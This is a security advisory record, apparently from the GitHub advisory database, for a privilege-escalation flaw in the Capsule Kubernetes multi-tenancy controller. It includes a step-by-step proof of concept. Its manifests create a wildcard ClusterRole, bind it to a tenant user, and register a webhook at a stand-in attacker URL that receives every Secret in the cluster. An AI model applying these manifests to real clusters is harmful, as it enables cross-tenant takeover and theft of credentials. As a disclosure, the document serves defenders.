@@ -1,0 +1,388 @@
+advisory_id: GHSA-qjjm-7j9w-pw72
+datasource_id: github_osv/GHSA-qjjm-7j9w-pw72
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-qjjm-7j9w-pw72/GHSA-qjjm-7j9w-pw72.json
+aliases:
+  - CVE-2026-22872
+summary: |
+  Capsule TenantResource RawItems Cluster-Scoped Resource Creation Vulnerability
+  # TenantResource RawItems Cluster-Scoped Resource Creation Vulnerability
+
+
+  ## Summary
+
+  The Capsule Controller runs with cluster-admin privileges. Although the TenantResource RawItems processing logic forcibly sets the namespace, this is ineffective for cluster-scoped resources. Tenant administrators can leverage the Controller's elevated privileges to create cluster-scoped resources (such as ClusterRole and ValidatingWebhookConfiguration) that they cannot create directly, achieving cross-tenant privilege escalation and cluster-level attacks.
+
+  ---
+
+  ## Details
+
+  ### Vulnerability Location
+
+  File: `internal/controllers/resources/processor.go`
+  Function: `HandleSection()`
+  Lines: 247-285
+
+  ### Core Issues
+
+  1. **Excessive Controller Privileges**: The Controller's ServiceAccount is bound to the cluster-admin ClusterRole
+     ```yaml
+     # ClusterRoleBinding: capsule-manager-rolebinding
+     roleRef:
+       kind: ClusterRole
+       name: cluster-admin
+     ```
+
+  2. **Missing Resource Scope Validation**: Although the code calls `obj.SetNamespace(ns.Name)`, this is ineffective for cluster-scoped resources (ClusterRole, ValidatingWebhookConfiguration, etc.), as the Kubernetes API ignores this field
+
+  3. **Missing Resource Type Validation**: No check for whether resources are cluster-scoped
+
+  ### Vulnerable Code Analysis
+
+  ```go
+  // internal/controllers/resources/processor.go
+  for rawIndex, item := range spec.RawItems {
+      template := string(item.Raw)
+
+      t := fasttemplate.New(template, "{{ ", " }}")
+      tmplString := t.ExecuteString(map[string]interface{}{
+          "tenant.name": tnt.Name,
+          "namespace":   ns.Name,
+      })
+
+      obj, keysAndValues := unstructured.Unstructured{}, []interface{}{"index", rawIndex}
+
+      // Issue 1: Accepts any resource type, including cluster-scoped resources
+      if _, _, decodeErr := codecFactory.UniversalDeserializer().Decode(
+          []byte(tmplString), nil, &obj); decodeErr != nil {
+          log.Error(decodeErr, "unable to deserialize rawItem", keysAndValues...)
+          syncErr = errors.Join(syncErr, decodeErr)
+          continue
+      }
+
+      // Issue 2: For cluster-scoped resources, this setting is ignored by API
+      obj.SetNamespace(ns.Name)
+
+      // Issue 3: Controller creates with cluster-admin privileges, no scope check
+      if rawErr := r.createOrUpdate(ctx, &obj, objLabels, objAnnotations); rawErr != nil {
+          log.Info("unable to sync rawItem", keysAndValues...)
+          syncErr = errors.Join(syncErr, rawErr)
+      }
+  }
+  ```
+
+  ### Attack Chain
+
+  ```
+  Tenant Owner (bob) - Has TenantResource creation permission
+    ↓
+  Creates TenantResource containing cluster-scoped resources
+    ↓
+  Capsule Controller (cluster-admin) processes RawItems
+    ↓
+  obj.SetNamespace() ignored by Kubernetes API (cluster-scoped resources have no namespace)
+    ↓
+  Successfully creates cluster-scoped resources (ClusterRole, ValidatingWebhook, etc.)
+    ↓
+  Cross-tenant privilege escalation / Cluster-level attacks
+  ```
+
+  ---
+
+  ## PoC
+
+  ### Environment Setup
+
+  Test Environment: Kubernetes 1.27+ cluster (verified using Kind cluster)
+
+  #### Step 1: Verify Capsule Controller Privileges
+
+  ```bash
+  kubectl get clusterrolebinding capsule-manager-rolebinding -o yaml
+  ```
+
+  Confirm output contains:
+  ```yaml
+  roleRef:
+    kind: ClusterRole
+    name: cluster-admin  # Controller has full cluster management privileges
+  ```
+
+  #### Step 2: Install Capsule and Create Test Tenant
+
+  Complete Capsule installation and tenant creation following previous environment setup steps.
+
+  #### Step 3: Verify bob's Permission Restrictions
+
+  **Verify bob can create TenantResource:**
+  ```bash
+  kubectl auth can-i create tenantresources --as bob --as-group projectcapsule.dev -n tenant-b-ns1
+  ```
+
+  Actual output:
+  ```
+  yes
+  ```
+
+  **Verify bob cannot create ClusterRole:**
+  ```bash
+  kubectl auth can-i create clusterroles --as bob --as-group projectcapsule.dev
+  ```
+
+  Actual output:
+  ```
+  Warning: resource 'clusterroles' is not namespace scoped in group 'rbac.authorization.k8s.io'
+
+  no
+  ```
+
+  **Verify bob cannot create ValidatingWebhook:**
+  ```bash
+  kubectl auth can-i create validatingwebhookconfigurations --as bob --as-group projectcapsule.dev
+  ```
+
+  Actual output:
+  ```
+  Warning: resource 'validatingwebhookconfigurations' is not namespace scoped in group 'admissionregistration.k8s.io'
+
+  no
+  ```
+
+  ### Attack Vector 1: Creating Malicious ClusterRole
+
+  #### Step 4: Create TenantResource Containing ClusterRole
+
+  Create file `attack-clusterrole.yaml`:
+
+  ```yaml
+  apiVersion: capsule.clastix.io/v1beta2
+  kind: TenantResource
+  metadata:
+    name: create-clusterrole
+    namespace: tenant-b-ns1
+  spec:
+    resyncPeriod: 60s
+    resources:
+      - namespaceSelector:
+          matchLabels:
+            capsule.clastix.io/tenant: tenant-b
+        rawItems:
+          - apiVersion: rbac.authorization.k8s.io/v1
+            kind: ClusterRole
+            metadata:
+              name: malicious-clusterrole
+            rules:
+            - apiGroups: ["*"]
+              resources: ["*"]
+              verbs: ["*"]
+  ```
+
+  Apply configuration **as bob user** (critical - must specify executor):
+
+  ```bash
+  kubectl apply -f attack-clusterrole.yaml --as bob --as-group projectcapsule.dev
+  ```
+
+  Actual output:
+  ```
+  tenantresource.capsule.clastix.io/create-clusterrole created
+  ```
+
+  **Important**: The `--as bob --as-group projectcapsule.dev` parameters are crucial for proving that bob (not the cluster admin) is executing this attack.
+
+  #### Step 5: Verify ClusterRole Creation
+
+  ```bash
+  kubectl get clusterrole malicious-clusterrole
+  ```
+
+  Actual output:
+  ```
+  NAME                    CREATED AT
+  malicious-clusterrole   2026-01-05T16:10:02Z
+  ```
+
+  View details:
+
+  ```bash
+  kubectl get clusterrole malicious-clusterrole -o yaml
+  ```
+
+  Key output:
+  ```yaml
+  apiVersion: rbac.authorization.k8s.io/v1
+  kind: ClusterRole
+  metadata:
+    annotations:
+      capsule.clastix.io/tenant: tenant-b
+    name: malicious-clusterrole
+  rules:
+  - apiGroups: ["*"]
+    resources: ["*"]
+    verbs: ["*"]
+  ```
+
+  **Verification Successful**: bob cannot directly create ClusterRole, but successfully created a cluster-scoped ClusterRole with all permissions through TenantResource.
+
+  #### Step 6: Exploit ClusterRole for Cross-Tenant Attack
+
+  Now bob can create a ClusterRoleBinding binding this ClusterRole to gain cluster-level privileges:
+
+  ```yaml
+  apiVersion: rbac.authorization.k8s.io/v1
+  kind: ClusterRoleBinding
+  metadata:
+    name: bob-cluster-admin
+  subjects:
+  - kind: User
+    name: bob
+    apiGroup: rbac.authorization.k8s.io
+  roleRef:
+    kind: ClusterRole
+    name: malicious-clusterrole
+    apiGroup: rbac.authorization.k8s.io
+  ```
+
+  After applying, bob will have full cluster management privileges and can access resources of all tenants.
+
+  ### Attack Vector 2: Creating Malicious ValidatingWebhook
+
+  #### Step 7: Create TenantResource Containing Webhook
+
+  Create file `attack-webhook.yaml`:
+
+  ```yaml
+  apiVersion: capsule.clastix.io/v1beta2
+  kind: TenantResource
+  metadata:
+    name: create-webhook
+    namespace: tenant-b-ns1
+  spec:
+    resyncPeriod: 60s
+    resources:
+      - namespaceSelector:
+          matchLabels:
+            capsule.clastix.io/tenant: tenant-b
+        rawItems:
+          - apiVersion: admissionregistration.k8s.io/v1
+            kind: ValidatingWebhookConfiguration
+            metadata:
+              name: malicious-webhook
+            webhooks:
+            - name: malicious.webhook.com
+              clientConfig:
+                url: "https://attacker-controlled-server.com/webhook"
+              rules:
+              - operations: ["CREATE", "UPDATE"]
+                apiGroups: [""]
+                apiVersions: ["v1"]
+                resources: ["secrets"]
+              admissionReviewVersions: ["v1"]
+              sideEffects: None
+              failurePolicy: Ignore
+  ```
+
+  Apply configuration **as bob user**:
+
+  ```bash
+  kubectl apply -f attack-webhook.yaml --as bob --as-group projectcapsule.dev
+  ```
+
+  Actual output:
+  ```
+  tenantresource.capsule.clastix.io/create-webhook created
+  ```
+
+  #### Step 8: Verify Webhook Creation
+
+  ```bash
+  kubectl get validatingwebhookconfiguration malicious-webhook
+  ```
+
+  Actual output:
+  ```
+  NAME                WEBHOOKS   AGE
+  malicious-webhook   1          5s
+  ```
+
+  **Verification Successful**: bob cannot directly create Webhook, but successfully created a cluster-scoped ValidatingWebhookConfiguration through TenantResource.
+
+  #### Step 9: Exploit Webhook to Steal Sensitive Data
+
+  At this point, whenever any user in the cluster creates or updates a Secret, the Kubernetes API Server will call the attacker-controlled webhook server, sending an AdmissionReview request containing the complete Secret content. The attacker can:
+
+  1. Steal Secret data from all tenants (database passwords, API keys, etc.)
+  2. Modify Secret contents
+  3. Deny legitimate Secret creation requests, achieving DoS attacks
+
+  ---
+
+  ## Impact
+
+  ### Affected Scope
+
+  This vulnerability affects all Capsule deployments with the following prerequisites:
+  1. Capsule Controller runs with cluster-admin privileges (default configuration)
+  2. Tenant Owner has permission to create TenantResource
+
+  ### Security Impact
+
+  1. **Cross-Tenant Privilege Escalation**
+     - Create ClusterRole to gain cluster-level privileges
+     - Break tenant isolation boundaries
+     - Access all resources of other tenants
+
+  2. **Large-Scale Sensitive Data Theft**
+     - Intercept all Secret creation/update requests through malicious Webhook
+     - Steal passwords, API keys, certificates, etc. across the entire cluster
+     - Real-time monitoring of all tenant sensitive operations
+
+  3. **Cluster-Level Denial of Service**
+     - Deny all API requests through Webhook
+     - Make the entire cluster unavailable
+     - Impact all tenants
+
+  4. **Cluster Pollution**
+     - Create malicious CRDs
+     - Modify StorageClass
+     - Impact cluster stability
+
+  5. **Persistent Backdoor**
+     - Created cluster-scoped resources persist
+     - Even if TenantResource is deleted, ClusterRole and other resources remain
+     - Difficult to detect and remove
+
+
+  ### Limiting Factors
+
+  1. Requires Tenant Owner privileges
+  2. Requires Capsule Controller running with cluster-admin privileges (default configuration)
+  3. Some clusters may have additional admission controllers blocking malicious resources
+impacted_packages: []
+severities:
+  - score: '6.9'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N/E:P
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-qjjm-7j9w-pw72/GHSA-qjjm-7j9w-pw72.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-20
+  - CWE-863
+references:
+  - url: https://github.com/projectcapsule/capsule
+    reference_type:
+    reference_id:
+  - url: https://github.com/projectcapsule/capsule/releases/tag/v0.13.0
+    reference_type:
+    reference_id:
+  - url: https://github.com/projectcapsule/capsule/security/advisories/GHSA-qjjm-7j9w-pw72
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-22872
+    reference_type:
+    reference_id:
+exploits: []
